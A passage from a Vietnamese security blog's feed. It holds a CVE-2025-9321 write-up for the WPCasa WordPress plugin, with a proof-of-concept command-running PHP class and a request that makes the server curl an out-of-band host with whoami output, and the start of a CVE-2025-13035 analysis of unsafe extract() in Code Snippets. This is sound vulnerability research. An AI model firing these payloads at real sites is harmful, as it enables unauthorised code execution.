0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Plugin đã đăng ký một action hook:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;add_action( &amp;#39;parse_request&amp;#39;, array( $this, &amp;#39;api_requests&amp;#39;), 0 );&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;parse_request&lt;/code&gt;: hook được kích hoạt rất sớm, ngay sau khi WordPress phân tích URL và tạo đối tượng &lt;code&gt;$wp&lt;/code&gt;. Đây là lúc các tham số query được xử lý. =&amp;gt; Ngay khi WordPress phân tích request, callback &lt;code&gt;api_requests&lt;/code&gt; của sẽ được gọi để xử lý các yêu cầu.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;flow&#34;&gt;&lt;span&gt;Flow&lt;/span&gt;&#xA;  &lt;a href=&#34;#flow&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;graph TD&#xA;&#xA;A[&amp;#34;Attacker sends request /?wpsight-api=payload&amp;#34;] --&amp;gt; B[&amp;#34;parse_request hook triggers api_requests()&amp;#34;]&#xA;&#xA;B --&amp;gt; C[&amp;#34;Read user input $_GET[&amp;#39;wpsight-api&amp;#39;]&amp;#34;]&#xA;C --&amp;gt; D[&amp;#34;$api = strtolower(esc_attr(...))&amp;#34;]&#xA;&#xA;D --&amp;gt; E{&amp;#34;class_exists($api)?&amp;#34;}&#xA;E -- Yes --&amp;gt; F[&amp;#34;Instantiate arbitrary class new $api() → constructor executes&amp;#34;]&#xA;E -- No --&amp;gt; G[&amp;#34;Skip class creation&amp;#34;]&#xA;&#xA;F --&amp;gt; H[&amp;#34;Trigger dynamic hook do_action(&amp;#39;wpsight_api_&amp;#39; . $api)&amp;#34;]&#xA;G --&amp;gt; H&#xA;&#xA;H --&amp;gt; I{&amp;#34;Hook handler exists?&amp;#34;}&#xA;I -- Yes --&amp;gt; J[&amp;#34;Callback executed → attacker-controlled code&amp;#34;]&#xA;I -- No --&amp;gt; K[&amp;#34;No action, but die(&amp;#39;1&amp;#39;) still called&amp;#34;]&#xA;&#xA;J --&amp;gt; L[&amp;#34;RCE achieved&amp;#34;]&#xA;K --&amp;gt; L&#xA;&#xA;L --&amp;gt; Z[&amp;#34;End&amp;#34;]&lt;/code&gt;&lt;/pre&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;proof-of-concept-poc&#34;&gt;&lt;span&gt;Proof of Concept (PoC)&lt;/span&gt;&#xA;  &lt;a href=&#34;#proof-of-concept-poc&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ol&gt;&#xA;&lt;li&gt;Tạo class evil và đặt trong wp-config.php để test:&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;class evil&#xA;{&#xA;    public $command = &amp;#34;ls /&amp;#34;;&#xA;&#x9;public function __construct() {&#xA;&#x9;&#x9;$this-&amp;gt;command = isset($_REQUEST[&amp;#39;cmd&amp;#39;]) ? $_REQUEST[&amp;#39;cmd&amp;#39;] : $this-&amp;gt;command;&#xA;&#x9;&#x9;die(system($this-&amp;gt;command));&#xA;&#x9;}&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;ol start=&#34;2&#34;&gt;&#xA;&lt;li&gt;Gửi request với payload:&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;GET /?wpsight-api=evil&amp;amp;cmd=curl&amp;#43;http://n9xe0s2jxjyt8klg2lxcj4b6jxpode13.oastify.com/?leaked=$(whoami) HTTP/1.1&#xA;Host: localhost&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-11-28-cve-2025-9321/result.png&#34; title=&#34;Kết quả&#34; data-thumbnail=&#34;/posts/2025-11-28-cve-2025-9321/result.png&#34; data-sub-html=&#34;&lt;h2&gt;Result&lt;/h2&gt;&lt;p&gt;Kết quả&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-28-cve-2025-9321/result.png&#39; alt=&#34;Result&#34; height=&#34;600&#34; width=&#34;1138&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Kết quả&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Lỗi xuất phát từ việc xử lý tham số &lt;code&gt;wpsight-api&lt;/code&gt; không an toàn, cho phép gọi class và hook tùy ý, dẫn đến RCE. Bản vá thêm kiểm soát đầu vào và giới hạn endpoint để chặn khai thác.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;key-takeaways&#34;&gt;&lt;span&gt;Key Takeaways&lt;/span&gt;&#xA;  &lt;a href=&#34;#key-takeaways&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;Dữ liệu URL cần được giới hạn bằng allow‑list.&lt;/li&gt;&#xA;&lt;li&gt;Hook và class động phải được bảo vệ khỏi input người dùng.&lt;/li&gt;&#xA;&lt;li&gt;Kiểm soát đầu vào sai có thể dẫn đến RCE nghiêm trọng.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/academy/wordpress/vulnerabilities/remote-code-execution/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Remote Code Execution (RCE)&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/database/wordpress/plugin/wpcasa/vulnerability/wordpress-wpcasa-plugin-1-4-1-unauthenticated-code-injection-vulnerability&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress WPCasa Plugin &amp;lt;= 1.4.1 is vulnerable to Remote Code Execution (RCE)&lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>CVE-2025-13035 Analysis &amp; POC</title>
      <link>http://localhost:1313/vi/posts/2025-11-27-cve-2025-13035/</link>
      <pubDate>Thu, 27 Nov 2025 19:00:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/vi/posts/2025-11-27-cve-2025-13035/</guid>
      <category domain="http://localhost:1313/vi/categories/cve-analysis/">CVE Analysis</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2025-11-27-cve-2025-13035/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;cve--basic-info&#34;&gt;&lt;span&gt;CVE &amp;amp; Basic Info&lt;/span&gt;&#xA;  &lt;a href=&#34;#cve--basic-info&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Plugin Code Snippets cho WordPress tồn tại lỗ hổng PHP Code Injection trong tất cả các phiên bản cho đến, và bao gồm, 3.9.1. Nguyên nhân là do plugin sử dụng &lt;code&gt;extract()&lt;/code&gt; trên shortcode attributes do attacker kiểm soát bên trong method &lt;code&gt;evaluate_shortcode_from_flat_file&lt;/code&gt;, có thể được dùng để ghi đè biến &lt;code&gt;$filepath&lt;/code&gt; và sau đó truyền vào require_once. Điều này cho phép attacker đã xác thực, với quyền Contributor trở lên, thực thi tùy ý PHP code trên server thông qua shortcode &lt;code&gt;[code_snippet]&lt;/code&gt; bằng cách sử dụng PHP filter chains nếu họ có thể lừa administrator bật tùy chọn &amp;ldquo;Enable file-based execution&amp;rdquo; và tạo ít nhất một Content snippet đang hoạt động.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2025-13035&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2025-13035&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: Remote Code Execution&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 3.9.1&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Patched Versions&lt;/strong&gt;: 3.9.2&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;: Medium (8.5)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: Contributor&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/plugins/code-snippets/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress Code Snippets Plugin&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-08-21-wordpress-local-and-debugging/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Virtual Machine&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-10-22-wordpress-local-and-debugging-docker/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Docker&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Plugin Version&lt;/strong&gt; - &lt;strong&gt;Code Snippets&lt;/strong&gt;:&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;3.9.1&lt;/code&gt; – &lt;strong&gt;vulnerable&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;3.9.2&lt;/code&gt; – &lt;strong&gt;patched&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Diff Tool (diff)&lt;/strong&gt; → &lt;a href=&#34;https://meldmerge.org/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Meld&lt;/strong&gt;&lt;/a&gt; hoặc bất kỳ công cụ diff nào.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;cause&#34;&gt;&lt;span&gt;Cause&lt;/span&gt;&#xA;  &lt;a href=&#34;#cause&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;Trong phiên bản lỗi (v3.9.1):&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;private function evaluate_shortcode_from_flat_file( $filepath, array $atts ): string {&#xA;    ob_start();&#xA;&#xA;    ( function( $atts ) use ( $filepath ) {&#xA;        /**&#xA;            * Avoiding extract is typically recommended, however in this situation we want to make it easy for snippet&#xA;            * authors to use custom attributes.&#xA;            *&#xA;            * @phpcs:disable WordPress.PHP.DontExtract.extract_extract&#xA;            */&#xA;        extract( $atts );&#xA;        require_once $filepath;&#xA;    } )( $atts );&#xA;&#xA;    return ob_get_clean();&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Trong hàm &lt;code&gt;evaluate_shortcode_from_flat_file&lt;/code&gt;, một &lt;strong&gt;anonymous function&lt;/strong&gt; được định nghĩa và gọi ngay lập tức (IIFE). Hàm này nhận tham số &lt;code&gt;$atts&lt;/code&gt; (mảng các attribute của shortcode) và sử dụng thêm biến &lt;code&gt;$filepath&lt;/code&gt; từ bên ngoài thông qua &lt;code&gt;use ($filepath)&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;p&gt;Lệnh &lt;code&gt;extract($atts)&lt;/code&gt; sẽ trích xuất các phần tử trong mảng &lt;code&gt;$atts&lt;/code&gt; thành biến riêng lẻ trong symbol table của scope hiện tại.&lt;/p&gt;&#xA;&lt;p&gt;Ví dụ:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;$atts = [&amp;#39;color&amp;#39; =&amp;gt; &amp;#39;blue&amp;#39;, &amp;#39;size&amp;#39; =&amp;gt; &amp;#39;large&amp;#39;];&#xA;extract($atts);&#xA;// Bây giờ có $color = &amp;#39;blue&amp;#39;, $size = &amp;#39;large&amp;#39;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Về mặt nội bộ, PHP quản lý biến thông qua &lt;strong&gt;zval container&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;div class=&#34;details admonition quote open disabled&#34;&gt;&#xA;  &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Trích dẫn&lt;/div&gt;&#xA;  &lt;div class=&#34;details-content&#34;&gt;&#xA;    &lt;div class=&#34;admonition-content&#34;&gt;&lt;p&gt;A PHP variable is stored in a container called a &amp;ldquo;zval&amp;rdquo;. A zval container contains, besides the variable&amp;rsquo;s type and value, two additional bits of information. The first is called &amp;ldquo;is_ref&amp;rdquo; and is a boolean value indicating whether or not the variable is part of a &amp;ldquo;reference set&amp;rdquo;. With this bit, PHP&amp;rsquo;s engine knows how to differentiate between normal variables and references. Since PHP allows user-land references, as created by the &amp;amp; operator, a zval container also has an internal reference counting mechanism to optimize memory usage. This second piece of additional information, called &amp;ldquo;refcount&amp;rdquo;, contains how many variable names (also called symbols) point to this one zval container. All symbols are stored in a symbol table, of which there is one per scope. There is a scope for the main script (i.e., the one requested through the browser), as well as one for every function or method.&lt;/p&gt;&lt;/div&gt;&#xA;  &lt;/div&gt;&#xA;&lt;/div&gt;&lt;p&gt;Khi &lt;code&gt;extract()&lt;/code&gt; chạy:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Mỗi phần tử trong &lt;code&gt;$atts&lt;/code&gt; được ánh xạ thành một biến mới.&lt;/li&gt;&#xA;&lt;li&gt;Các biến này trỏ đến cùng một &lt;strong&gt;zval&lt;/strong&gt; với giá trị trong mảng.&lt;/li&gt;&#xA;&lt;li&gt;Điều này làm tăng &lt;strong&gt;refcount&lt;/strong&gt; (số lượng tên biến cùng tham chiếu đến một giá trị).&lt;/li&gt;&#xA;&lt;li&gt;Khi scope kết thúc, symbol table bị hủy, refcount giảm xuống và bộ nhớ được giải phóng.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;div class=&#34;details admonition bug open disabled&#34;&gt;&#xA;  &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-bug&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Lỗi&lt;/div&gt;&#xA;  &lt;div class=&#34;details-content&#34;&gt;&#xA;    &lt;div class=&#34;admonition-content&#34;&gt;&lt;p&gt;&lt;strong&gt;Xung đột tên biến:&lt;/strong&gt;&#xA;Nếu &lt;code&gt;$atts&lt;/code&gt; chứa key trùng với biến đã tồn tại trong scope (ví dụ &lt;code&gt;&amp;quot;filepath&amp;quot;&lt;/code&gt;), thì biến đó sẽ bị ghi đè.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;$atts = [&amp;#39;filepath&amp;#39; =&amp;gt; &amp;#39;/tmp/malicious.php&amp;#39;];&#xA;extract($atts);&#xA;require_once $filepath; // giờ sẽ nạp file từ $atts, không phải file gốc&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Đây chính là nguyên nhân gây ra lỗ hổng: attacker có thể chèn giá trị &lt;code&gt;&amp;quot;filepath&amp;quot;&lt;/code&gt; để điều khiển file được &lt;code&gt;require_once&lt;/code&gt;.&lt;/p&gt;&lt;/div&gt;&#xA;  &lt;/div&gt;&#xA;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;Bản vá (v3.9.2):&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-11-27-cve-2025-13035/diff.png&#34; title=&#34;Sự thay đổi của bản vá&#34; data-thumbnail=&#34;/posts/2025-11-27-cve-2025-13035/diff.png&#34; data-sub-html=&#34;&lt;h2&gt;Diff&lt;/h2&gt;&lt;p&gt;Sự thay đổi của bản vá&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-27-cve-2025-13035/diff.png&#39; alt=&#34;Diff&#34; height=&#34;325&#34; width=&#34;1826&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Sự thay đổi của bản vá&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;Trong bản vá, hàm &lt;code&gt;extract()&lt;/code&gt; đã được bổ sung option &lt;code&gt;EXTR_SKIP&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Tùy chọn này đảm bảo rằng nếu &lt;code&gt;$atts&lt;/code&gt; có key trùng với biến đã tồn tại, biến gốc sẽ không bị ghi đè.&lt;/li&gt;&#xA;&lt;li&gt;Nhờ đó, &lt;code&gt;$filepath&lt;/code&gt; được truyền từ bên ngoài vẫn giữ nguyên giá trị an toàn, loại bỏ nguy cơ bị thay thế bởi dữ liệu từ &lt;code&gt;$atts&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;analysis&#34;&gt;&lt;span&gt;Analysis&lt;/span&gt;&#xA;  &lt;a href=&#34;#analysis&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Plugin đã đăng ký một shortcode:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public const CONTENT_SHORTCODE = &amp;#39;code_snippet&amp;#39;;&#xA;add_shortcode( self::CONTENT_SHORTCODE, [ $this, &amp;#39;render_content_shortcode&amp;#39; ] );&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Khi shortcode này xuất hiện trong nội dung của post/page, WordPress sẽ gọi callback 